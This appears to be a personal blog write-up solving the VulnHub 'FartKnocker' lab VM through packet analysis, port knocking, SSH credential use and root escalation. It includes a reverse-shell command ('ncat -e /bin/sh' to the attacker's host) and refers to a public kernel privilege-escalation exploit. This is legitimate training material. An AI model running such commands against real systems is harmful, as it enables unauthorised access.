<p>Another VM is done. Here is the writeup. And here is the <a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/">link to the VM on vulnhub</a>.</p>

[/code]</p>
<p>So port 80 is the only one open. An interesting little detail here is that it says that it found "65534 closed ports", and then it says: Reason: 65534 resets. I think that means that the server has responded with RST/ACK. Something I learned in this challenge. But we will get to that.</p>
<p>On port 80 we find a file named pcap1.pcap. So I open it up in wireshark.<br />
To the experienced packet-inspector I guess that it is quite obvious what is going on in this packet-capture. But I had never heard about port-knocking. So I got lost on a detour for quite some time. I was inspecting the ICMP-packets. All of those packets ended with "!"#$%&amp;'()*+,-./01234567". Something that I though was suspicious. So I started googeling about hacks that use ICMP and found a lot.</p>
<p>It turns out that you can use the ICMP-protocol to hide, or tunnel, other services. So I thought that someone had injected a Loki-rootkit into the server, and what I was observing was the communication between the hacker (with ip ...102) and the victim-server. And that I was supposed to enter through the same exploit. But after going through the ICMP-packets in detail I realized that they really were just pings, and nothing else. They never contained more data than the default "!"#$%&amp;'()*+,-./01234567", which I learned could be used to fingerprint the server. This data meant that the server probably was a linux. So after discarding all the ICMP packets I started to look into the TCP-packets more closely. And after some creative googeling about ports I learned about port-knocking.</p>
<h3>Port knocking</h3>
<p>So I downloaded knockd, that is used to implement port-knocking. And I got it to work by running this command:<br />
[code]<br />
knock 192.168.1.103 7000 8000 9000<br />
nc 192.168.1.103 8888<br />
[/code]</p>
<p>This also worked:</p>
<p>[code]<br />
for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 192.168.1.103; done<br />
nc 192.168.1.103 8888<br />
[/code]</p>
<p>And this:</p>
<p>[code]<br />
nc 192.168.1.103 7000<br />
nc 192.168.1.103 8000<br />
nc 192.168.1.103 9000<br />
nc 192.168.1.103 8888<br />
[/code]</p>
<p>Anyways, it lead me to this address: /burgerworld. I downloaded the pcap-file and continued. I went through each and every packet in detail to understand how they all worked. But I am not going to bore you with that. So I right-clicked on a TCP-packet and then clicked on follow tcp-stream. And it showed me a nice ascii-image of beavis (or butthead, can't remember who's who). And the text: eins drei drei sieben. So I google-translated the text, and it was what I though, the classic number 1337. So after trying every single possible combination of portknocking I finally figured out that it was supposed to be 1 3 3 7. And then nc to port 1337. There I found: /iamcornholio/ which gave me this text:</p>
<p>"huhhuhhh...Hey Beavis...Im all about uhhh...huhuh...that base huhhuhhh...</p>
<p> T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK"<br />
So the base-comment made me think that it was probably base64-encoded. And it was.</p>
<p>It translated into: Open up SSH: 8888 9999 7777 6666<br />
So I knocked the port and got access to port 22.</p>
<p>[code]<br />
$ ssh root@192.168.1.103                                                   1 â†µ<br />
The authenticity of host '192.168.1.103 (192.168.1.103)' can't be established.<br />
ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.<br />
Are you sure you want to continue connecting (yes/no)? yes<br />
Warning: Permanently added '192.168.1.103' (ECDSA) to the list of known hosts.<br />
############################################<br />
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #<br />
# USERNAME: butthead                       #<br />
# PASSWORD: nachosrule                     #<br />
############################################<br />
[/code]</p>
<p>So I logged in as butthead, but was immedietly thrown out.</p>
<p>From doing some challenges on overthewire I learned that you can execute commands with SSH without getting an actual shell.</p>
<p>But first I downloaded sshpass to be able to make the process a bit easier, and then:<br />
[code]<br />
sshpass -p nachosrule ssh butthead@192.168.1.103 ls<br />
nachos<br />
[/code]</p>
<p>So then I used nc to get a permanent shell.<br />
[code]<br />
$ sshpass -p nachosrule ssh butthead@192.168.1.103 &quot;ncat -e /bin/sh 192.168.1.106 1234&quot;<br />
[/code]</p>
<h2>Escalation</h2>
<p>So I got a shell, and it was time to escalate.<br />
I ran the linEnum.sh script and waded through the info. And checked for vulns on sudo. But nothing really of interest. Some meaningless tuff in /tmp, some scripts in beavis. Then I found pcap3 and pcap4. That I studied thoroughly. In pcap4 I saw that there was some ssh-keychanges going on, and some encrypted data-transfer. But after some googeling I concluded that there is not really any way I could possibly break that. SSH with Diffie-hellman seems pretty waterproof.</p>
<p>In the end I ended up running the Ubuntu 14 priv-exploit that I have used on some other VM:s. This one: https://www.exploit-db.com/exploits/37292/. That exploit really is incredible/incredibly dangerous.</p>
<p>So I became root and got the SECRETZ in /root. </p>
<h2>Conclusion</h2>
<p>Packet-analysis really was awesome. A lot of fun and interesting stuff. I feel like I have really started to get a grip of how packets are structured, and started to get to know Wireshark a lot more. So the main takeaways from this VM really was learning packet-analysis and about port-knocking.</p>
<p>Thanks to <a href="https://www.top-hat-sec.com/r4v3ns-blog/fartknocker-vm-challenge">top-hat-sec</a> for another great VM!</p>
<p>After reading other writeups I learned about https://digi.ninja/projects/cewl.php. Which I am really excited about trying out. Gonna try it soon.</p>
